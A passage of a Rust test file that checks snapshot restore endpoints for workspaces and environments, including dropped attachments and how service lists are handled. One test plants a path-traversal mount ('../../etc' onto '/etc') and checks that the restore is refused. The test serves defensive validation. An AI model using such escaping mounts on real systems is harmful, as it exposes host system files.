    assert!(s.rec.sent("POST", &format!("{API}/workspaces")).is_empty(), "nothing written");
}

/// An attachment to an environment the caller cannot see is dropped, not refused: the environment
/// may be gone or someone else's, and neither makes the snapshot unrestorable.
#[tokio::test]
async fn a_frozen_attachment_the_caller_cannot_see_is_dropped() {
    let mut state = workspace_state("alpine:3.19", &[], 7);
    state["attachedEnvironment"] = json!("env-theirs");
    let s = server_with_snapshot_only("snap-ws", Some(state)).await;
    let r = restore(&s, "/v1/workspaces/restore", json!({"name": "back", "snapshot_id": "snap-ws"})).await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let w = &s.rec.sent("POST", &format!("{API}/workspaces"))[0];
    assert!(w["spec"]["attachedEnvironment"].is_null(), "{w}");
}

#[tokio::test]
async fn restoring_an_environment_without_services_takes_the_snapshots() {
    let s = server_with_env_snapshot_only("snap-env", Some(environment_state(2, 9))).await;
    let r = restore(&s, "/v1/environments/restore", json!({"name": "back", "snapshot_id": "snap-env"})).await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let e = &s.rec.sent("POST", &format!("{API}/environments"))[0];
    assert_eq!(e["spec"]["services"].as_array().unwrap().len(), 2);
    assert_eq!(e["spec"]["storage"]["quotaGb"], 9);
}

/// An explicit empty list is a choice — the data back, no services — and must not be read as
/// "absent, so take the snapshot's".
#[tokio::test]
async fn restoring_an_environment_with_empty_services_restores_data_only() {
    let s = server_with_env_snapshot_only("snap-env", Some(environment_state(2, 9))).await;
    let r = restore(
        &s,
        "/v1/environments/restore",
        json!({"name": "back", "snapshot_id": "snap-env", "services": []}),
    )
    .await;
    assert_eq!(r.status(), 202, "{}", r.text().await.unwrap());
    let e = &s.rec.sent("POST", &format!("{API}/environments"))[0];
    assert_eq!(e["spec"]["services"].as_array().unwrap().len(), 0);
    assert_eq!(e["spec"]["storage"]["quotaGb"], 9, "quota still comes from the snapshot");
}

/// A frozen service list is no more trusted than a body one — `check_services` is the trust
/// boundary for mounts whichever source the list came from.
#[tokio::test]
async fn a_frozen_service_with_an_escaping_mount_is_refused() {
    let mut state = environment_state(1, 9);
    state["services"][0]["mounts"] = json!([{"folder": "../../etc", "path": "/etc"}]);
    let s = server_with_env_snapshot_only("snap-env", Some(state)).await;
    let r = restore(&s, "/v1/environments/restore", json!({"name": "back", "snapshot_id": "snap-env"})).await;
    assert_eq!(r.status(), 400, "{}", r.text().await.unwrap());
    assert!(s.rec.sent("POST", &format!("{API}/environments")).is_empty(), "nothing written");
}
